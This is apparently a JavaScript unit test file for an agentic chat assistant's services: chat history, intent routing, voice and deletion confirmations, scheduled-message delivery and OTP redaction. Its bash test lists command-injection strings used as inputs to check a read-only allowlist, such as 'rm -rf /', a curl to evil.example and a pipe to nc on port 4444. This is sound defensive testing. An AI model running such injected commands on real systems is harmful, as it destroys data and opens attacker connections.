/**
 * unit_services.test.js
 *
 * Pruebas unitarias de los servicios nuevos o modificados en la fase de
 * mejoras agénticas: historial por chat, clasificador de respaldo,
 * confirmacion de acciones criticas por voz, puerta de confirmacion del
 * borrado masivo de memoria y seguimiento de entrega de mensajes
 * programados.
 *
 * Strict Policy: Zero Emojis.
 */

import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'fs';
import os from 'os';
import path from 'path';

// --- conversationHistoryService (directorio aislado temporal) ---
const dirHistorial = fs.mkdtempSync(path.join(os.tmpdir(), 'davis-history-'));
process.env.DAVIS_HISTORY_DIR = dirHistorial;

const historial = await import('../../src/services/conversationHistoryService.js');
const intentRouter = await import('../../src/core/intentRouterService.js');
const voz = await import('../../src/services/voiceConfirmationService.js');
const memoria = await import('../../src/services/memoryService.js');
const programados = await import('../../src/services/scheduledMessageService.js');

test('[Unit] Historial: aislamiento por chat y ventana deslizante', () => {
  historial.limpiarHistorial('chat-a@test');
  historial.limpiarHistorial('chat-b@test');

  historial.registrarIntercambio('chat-a@test', 'hola', 'hola, senor');
  historial.registrarIntercambio('chat-b@test', 'secreto de b', 'respuesta de b');

  const hA = historial.obtenerHistorial('chat-a@test');
  const hB = historial.obtenerHistorial('chat-b@test');

  assert.equal(hA.length, 2);
  assert.ok(hA.every((m) => !String(m.content).includes('secreto de b')), 'el chat A no debe ver contenido del chat B');
  assert.ok(hB.some((m) => String(m.content).includes('secreto de b')));

  // Ventana: mas de MAX_MENSAJES_VENTANA mensajes recorta a los ultimos
  historial.limpiarHistorial('chat-c@test');
  for (let i = 0; i < 20; i++) {
    historial.registrarIntercambio('chat-c@test', `pregunta ${i}`, `respuesta ${i}`);
  }
  const hC = historial.obtenerHistorial('chat-c@test');
  assert.equal(hC.length, historial.MAX_MENSAJES_VENTANA);
  assert.ok(hC[hC.length - 1].content.includes('19'), 'debe conservar los mensajes mas recientes');
  assert.ok(!hC.some((m) => m.content.includes('pregunta 0')), 'los antiguos salen de la ventana');
});

test('[Unit] Historial: condensacion con LLM inyectable conserva resumen', async () => {
  historial.limpiarHistorial('chat-d@test');
  for (let i = 0; i < historial.MAX_MENSAJES_ARCHIVO; i++) {
    historial.registrarMensaje('chat-d@test', i % 2 === 0 ? 'user' : 'assistant', `mensaje ${i}`);
  }
  const resCondensa = await historial.condensarHistorial('chat-d@test', {
    chatCompletion: async () => ({ message: { content: 'Resumen de los mensajes 0 a 19.' } })
  });
  assert.equal(resCondensa.ok, true);
  assert.equal(resCondensa.condensado, true);
  assert.equal(typeof resCondensa.resumen, 'string');
  const h = historial.obtenerHistorial('chat-d@test');
  assert.ok(h[0].content.includes('Resumen de los mensajes'), 'el resumen debe encabezar el historial');
});

test('[Unit] Historial: chat desconocido devuelve vacio', () => {
  assert.deepEqual(historial.obtenerHistorial('chat-inexistente@test'), []);
});

// --- intentRouterService ---
test('[Unit] Router modelo: parser tolerante de clasificaciones', () => {
  const ok = intentRouter.parsearClasificacion('{"intencion": "clima", "confianza": 0.9}');
  assert.equal(ok.intencion, 'clima');
  assert.equal(ok.confianza, 0.9);

  const embebido = intentRouter.parsearClasificacion('Claro: {"intencion": "memoria", "confianza": 0.7} eso es.');
  assert.equal(embebido.intencion, 'memoria');

  assert.equal(intentRouter.parsearClasificacion('{"intencion": "inexistente", "confianza": 0.9}'), null);
  assert.equal(intentRouter.parsearClasificacion('{"intencion": "clima", "confianza": 3}'), null);
  assert.equal(intentRouter.parsearClasificacion('sin json'), null);
  assert.equal(intentRouter.parsearClasificacion(''), null);
});

test('[Unit] Router modelo: clasifica con mock y cachea el resultado', async () => {
  let llamadas = 0;
  const chatCompletion = async () => {
    llamadas += 1;
    return { message: { content: '{"intencion": "noticias", "confianza": 0.85}' } };
  };
  const mensaje = 'cuentame algo del mundillo de los coches electricos ' + Date.now();
  const primera = await intentRouter.clasificarIntencionConModelo(mensaje, { chatCompletion });
  assert.equal(primera.intencion, 'noticias');
  assert.equal(primera.origen, 'modelo');
  assert.ok(primera.herramientas.length > 0, 'confianza alta debe traducirse en herramientas');

  const segunda = await intentRouter.clasificarIntencionConModelo(mensaje, { chatCompletion });
  assert.equal(segunda.origen, 'cache');
  assert.equal(llamadas, 1, 'la segunda consulta debe salir de la cache');
});

test('[Unit] Router modelo: baja confianza no ofrece herramientas y error devuelve null', async () => {
  const baja = await intentRouter.clasificarIntencionConModelo('mensaje ambiguo de prueba ' + Date.now(), {
    chatCompletion: async () => ({ message: { content: '{"intencion": "clima", "confianza": 0.2}' } })
  });
  assert.equal(baja.herramientas.length, 0);

  const fallo = await intentRouter.clasificarIntencionConModelo('mensaje que rompe el mock ' + Date.now(), {
    chatCompletion: async () => { throw new Error('modelo caido'); }
  });
  assert.equal(fallo, null);
});

// --- voiceConfirmationService ---
test('[Unit] Voz: ciclo completo pendiente -> confirmado / cancelado / nuevo', () => {
  voz.limpiarPendientesVoz();

  assert.equal(voz.resolverConfirmacionVoz('chat-v@test', 'si'), null, 'sin pendiente no hay nada que resolver');

  voz.guardarPendienteVoz('chat-v@test', 'enviale un mensaje a mama que llego tarde');
  const conf = voz.resolverConfirmacionVoz('chat-v@test', 'si');
  assert.equal(conf.resultado, 'confirmado');
  assert.ok(conf.textoOriginal.includes('llego tarde'));

  voz.guardarPendienteVoz('chat-v@test', 'borra todos los recuerdos');
  const canc = voz.resolverConfirmacionVoz('chat-v@test', 'no');
  assert.equal(canc.resultado, 'cancelado');

  voz.guardarPendienteVoz('chat-v@test', 'ejecuta el comando df -h');
  const nuevo = voz.resolverConfirmacionVoz('chat-v@test', 'que tiempo hace?');
  assert.equal(nuevo.resultado, 'nuevo', 'otro mensaje descarta lo pendiente');
  assert.equal(voz.obtenerPendienteVoz('chat-v@test'), null);
});

test('[Unit] Voz: deteccion de acciones criticas y caducidad', () => {
  assert.ok(voz.esAccionCriticaPorVoz('enviale un mensaje a Juan que no voy'));
  assert.ok(voz.esAccionCriticaPorVoz('borra todos los recuerdos'));
  assert.ok(voz.esAccionCriticaPorVoz('ejecuta el comando rm en la terminal'));
  assert.ok(!voz.esAccionCriticaPorVoz('que tiempo hace en Madrid'));
  assert.ok(!voz.esAccionCriticaPorVoz(''));

  voz.limpiarPendientesVoz();
  const ahora = Date.now();
  voz.guardarPendienteVoz('chat-t@test', 'cancela todos los recordatorios', { now: () => ahora });
  const caducado = voz.obtenerPendienteVoz('chat-t@test', { now: () => ahora + voz.TTL_CONFIRMACION_MS + 1000 });
  assert.equal(caducado, null, 'tras el TTL la accion pendiente caduca');
});

// --- memoryService: puerta de confirmacion del borrado masivo ---
test('[Unit] Memoria: borrado masivo exige confirmacion explicita', () => {
  const resSinConfirmar = memoria.olvidarMemoria('*');
  assert.equal(resSinConfirmar.ok, false);
  assert.equal(resSinConfirmar.requiereConfirmacion, true);
  assert.equal(typeof resSinConfirmar.total, 'number');

  const resTodos = memoria.olvidarMemoria('todos');
  assert.equal(resTodos.requiereConfirmacion, true, 'tambien con la palabra "todos"');
});

// --- scheduledMessageService: seguimiento de entrega ---
test('[Unit] Programados: registrarIdWhatsApp y acuses de recibo', () => {
  const creado = programados.programarMensaje({
    numero: '+34600999000',
    mensaje: 'mensaje de prueba unitaria',
    minutosEnElFuturo: 60
  });
  assert.equal(creado.ok, true, 'debe crearse el mensaje programado de prueba');
  const id = creado.programado.id;
  assert.ok(id, 'el mensaje debe llevar un id propio');

  const wamid = `WAMID-TEST-${Date.now()}-${Math.floor(Math.random() * 10000)}`;
  assert.equal(programados.registrarIdWhatsApp(id, wamid), true);
  assert.equal(programados.registrarIdWhatsApp('id-inexistente', 'WAMID-X'), false);

  // Simular que el mensaje ya fue despachado al canal (solo los enviados
  // reales pueden recibir acuses de recibo)
  const lista = programados.leerMensajesProgramados();
  const fixture = lista.find((m) => m.id === id);
  fixture.enviado = true;
  fixture.estado = 'enviado';
  programados.guardarMensajesProgramados(lista);

  const entregado = programados.procesarActualizacionEntrega([
    { key: { id: wamid }, update: { status: 3 } }
  ]);
  assert.equal(entregado.length, 1, 'el acuse entregado debe actualizar el estado');
  assert.equal(entregado[0].estado, 'entregado');

  const leido = programados.procesarActualizacionEntrega([
    { key: { id: wamid }, update: { status: 4 } }
  ]);
  assert.equal(leido.length, 1, 'el acuse leido debe actualizar el estado');
  assert.equal(leido[0].estado, 'leido');

  const fallo = programados.procesarActualizacionEntrega([
    { key: { id: wamid }, update: { error: new Error('fallo de entrega') } }
  ]);
  assert.equal(fallo.length, 1, 'el acuse de error debe marcar el mensaje como fallido');
  assert.equal(fallo[0].estado, 'fallido');

  // Limpieza del fixture
  programados.cancelarMensajeProgramado(id);
});

// --- destructiveActionService: confirmacion fuera del modelo ---
const destructivas = await import('../../src/services/destructiveActionService.js');

test('[Unit] Borrado masivo: confirmacion ligada a chat, id, TTL y un solo uso', () => {
  destructivas.limpiarBorradosPendientes();
  const ahora = Date.now();
  const deps = { now: () => ahora };

  const id = destructivas.registrarBorradoMasivoPendiente('chat-david@test', '*', 12, deps);
  assert.ok(id && id.startsWith('borr_'), 'debe devolver un id de confirmacion');

  // Mensaje que no es confirmacion
  assert.equal(destructivas.resolverConfirmacionBorrado('chat-david@test', 'hola', deps), null);

  // Chat equivocado: no confirma ni revela
  const otro = destructivas.resolverConfirmacionBorrado('chat-otro@test', `confirmar borrado ${id}`, deps);
  assert.equal(otro.confirmado, false);

  // Id equivocado
  const malId = destructivas.resolverConfirmacionBorrado('chat-david@test', 'confirmar borrado borr_ffffff', deps);
  assert.equal(malId.confirmado, false);

  // Confirmacion correcta: se consume (un solo uso)
  const bien = destructivas.resolverConfirmacionBorrado('chat-david@test', `confirmar borrado ${id}`, deps);
  assert.equal(bien.confirmado, true);
  assert.equal(bien.total, 12);
  const segunda = destructivas.resolverConfirmacionBorrado('chat-david@test', `confirmar borrado ${id}`, deps);
  assert.equal(segunda.confirmado, false, 'el id consumido no sirve dos veces');

  // Caducidad
  const id2 = destructivas.registrarBorradoMasivoPendiente('chat-david@test', '*', 3, deps);
  const tarde = destructivas.resolverConfirmacionBorrado('chat-david@test', `confirmar borrado ${id2}`, { now: () => ahora + destructivas.TTL_BORRADO_MS + 1000 });
  assert.equal(tarde.confirmado, false);
  assert.ok(tarde.motivo.includes('caducado'));
});

test('[Unit] Programados: entrega incierta no se reintenta (sin duplicados)', async () => {
  const creado = programados.programarMensaje({
    numero: '+34600998111',
    mensaje: 'prueba de entrega incierta',
    minutosEnElFuturo: 0,
    inmediato: false
  });
  assert.equal(creado.ok, true);
  const idInc = creado.programado.id;

  // Forzar que este pendiente de despacho inmediato
  const lista0 = programados.leerMensajesProgramados();
  lista0.find((m) => m.id === idInc).timestamp = Date.now() - 1000;
  programados.guardarMensajesProgramados(lista0);

  // 1) Envio confirmado por el canal: se marca enviado y NO se reenvia aunque el acuse se pierda
  programados.iniciarMonitorMensajesProgramados(async () => true, 60 * 60 * 1000);
  let despachados = await programados.despacharMensajesPendientes();
  assert.ok(despachados.some((m) => m.id === idInc), 'debe despacharse la primera vez');
  despachados = await programados.despacharMensajesPendientes();
  assert.ok(!despachados.some((m) => m.id === idInc), 'no debe reenviarse aunque no llegue acuse');

  // 2) Resultado incierto: sale de la cola como 'incierto' y no se reintenta
  const creado2 = programados.programarMensaje({
    numero: '+34600998222',
    mensaje: 'prueba incierta 2',
    minutosEnElFuturo: 0,
    inmediato: false
  });
  const idInc2 = creado2.programado.id;
  const lista1 = programados.leerMensajesProgramados();
  lista1.find((m) => m.id === idInc2).timestamp = Date.now() - 1000;
  programados.guardarMensajesProgramados(lista1);

  programados.iniciarMonitorMensajesProgramados(async () => ({ incierto: true }), 60 * 60 * 1000);
  const ronda = await programados.despacharMensajesPendientes();
  assert.ok(ronda.fallidos.some((m) => m.id === idInc2 && m.estado === 'incierto'), 'debe marcarse incierto');
  const ronda2 = await programados.despacharMensajesPendientes();
  assert.ok(!ronda2.some((m) => m.id === idInc2) && !ronda2.fallidos.some((m) => m.id === idInc2), 'el incierto no se reintenta');

  // 3) Fallo SIN transmision: se reintenta
  const creado3 = programados.programarMensaje({
    numero: '+34600998333',
    mensaje: 'prueba fallo seguro 3',
    minutosEnElFuturo: 0,
    inmediato: false
  });
  const idInc3 = creado3.programado.id;
  const lista2 = programados.leerMensajesProgramados();
  lista2.find((m) => m.id === idInc3).timestamp = Date.now() - 1000;
  programados.guardarMensajesProgramados(lista2);

  let intentos = 0;
  programados.iniciarMonitorMensajesProgramados(async () => { intentos += 1; return false; }, 60 * 60 * 1000);
  await programados.despacharMensajesPendientes();
  await programados.despacharMensajesPendientes();
  assert.equal(intentos, 2, 'el fallo sin transmision si se reintenta');

  // Limpieza
  programados.detenerMonitorMensajesProgramados();
  programados.cancelarMensajeProgramado(idInc);
  programados.cancelarMensajeProgramado(idInc2);
  programados.cancelarMensajeProgramado(idInc3);
});

// --- bashConsoleService: verificacion posterior solo-lectura e inmune a inyeccion ---
const bashSvc = await import('../../src/system/bashConsoleService.js');

test('[Unit] Bash: verificacion posterior es allowlist de solo lectura e inmune a inyeccion', () => {
  const PERMITIDO = /^(pm2 status( [\w@./-]+)?|systemctl is-active [\w@.-]+|service [\w@.-]+ status|docker inspect -f '\{\{\.State\.Status\}\}' [\w.-]+|docker ps|ufw status)$/;

  // Casos legitimos
  const legitimos = [
    'pm2 restart davis-bot',
    'systemctl restart nginx',
    'service ssh restart',
    'docker restart mi-contenedor',
    'docker-compose up -d',
    'ufw allow 22/tcp'
  ];
  for (const cmd of legitimos) {
    const probe = bashSvc.buildVerificationCommand(cmd);
    assert.ok(probe, `debe generar verificacion para: ${cmd}`);
    assert.ok(PERMITIDO.test(probe), `verificacion fuera del allowlist: ${probe}`);
    assert.ok(!/[$`;&|<>\\]/.test(probe), `verificacion con metacaracteres: ${probe}`);
  }

  // Intentos de inyeccion: el token capturado no admite metacaracteres
  const trampas = [
    'pm2 restart app$(whoami)',
    'pm2 restart app; rm -rf /',
    'systemctl restart nginx && curl http://evil.example',
    'docker restart app`id`',
    'service ssh restart | nc atacante 4444',
    'pm2 restart "app; touch /tmp/pwn"'
  ];
  for (const cmd of trampas) {
    const probe = bashSvc.buildVerificationCommand(cmd);
    if (probe !== null) {
      assert.ok(PERMITIDO.test(probe), `inyeccion colada en verificacion: ${cmd} -> ${probe}`);
    }
  }

  // Comandos sin verificacion conocida: null (sin ejecucion extra)
  assert.equal(bashSvc.buildVerificationCommand('echo hola'), null);
  assert.equal(bashSvc.buildVerificationCommand('pm2 status api'), null, 'una lectura no genera otra verificacion');
  assert.equal(bashSvc.buildVerificationCommand(''), null);
});

test('[Unit] Historial: redacta OTP y credenciales antes de persistir', () => {
  historial.limpiarHistorial('chat-redact@test');
  historial.registrarMensaje('chat-redact@test', 'user', 'confirmar otp 123456');
  historial.registrarMensaje('chat-redact@test', 'assistant', 'Codigo de autorizacion 2FA para el comando: 999888');
  const h = historial.obtenerHistorial('chat-redact@test');
  const conjunto = h.map((m) => m.content).join('\n');
  assert.ok(!conjunto.includes('123456'), 'el OTP no debe persistirse');
  assert.ok(conjunto.includes('[redactado: dato sensible]'));
});

// --- scheduledMessageService: acuse perdido (hallazgo revision 3, punto 2) ---
test('[Unit] Programados: enviado sin acuse pasa a incierto sin reintentar', async () => {
  const antiguo = programados.programarMensaje({
    numero: '+34600999001',
    mensaje: 'fixture acuse perdido antiguo',
    minutosEnElFuturo: 120
  });
  const fresco = programados.programarMensaje({
    numero: '+34600999002',
    mensaje: 'fixture acuse perdido fresco',
    minutosEnElFuturo: 120
  });
  assert.equal(antiguo.ok, true);
  assert.equal(fresco.ok, true);

  const lista = programados.leerMensajesProgramados();
  const fA = lista.find((m) => m.id === antiguo.programado.id);
  const fF = lista.find((m) => m.id === fresco.programado.id);
  fA.enviado = true;
  fA.estado = 'enviado';
  fA.enviadoEn = new Date(Date.now() - programados.TIMEOUT_ACUSE_MS - 60000).toISOString();
  fF.enviado = true;
  fF.estado = 'enviado';
  fF.enviadoEn = new Date().toISOString();
  programados.guardarMensajesProgramados(lista);

  const despachados = await programados.despacharMensajesPendientes();
  const inciertos = despachados.fallidos.filter((m) => m.estado === 'incierto');

  const listaFinal = programados.leerMensajesProgramados();
  const rA = listaFinal.find((m) => m.id === antiguo.programado.id);
  const rF = listaFinal.find((m) => m.id === fresco.programado.id);
  assert.equal(rA.estado, 'incierto', 'el enviado antiguo sin acuse queda incierto');
  assert.ok(inciertos.some((m) => m.id === antiguo.programado.id), 'se notifica para revision manual');
  assert.equal(rA.enviado, true, 'sin reintento: sigue marcado como salido de la cola de pendientes');
  assert.equal(rF.estado, 'enviado', 'el enviado reciente conserva su estado y su acuse puede llegar');
  assert.equal(rF.intentos || 0, 0, 'no hubo reintentos');

  programados.cancelarMensajeProgramado(antiguo.programado.id);
  programados.cancelarMensajeProgramado(fresco.programado.id);
});
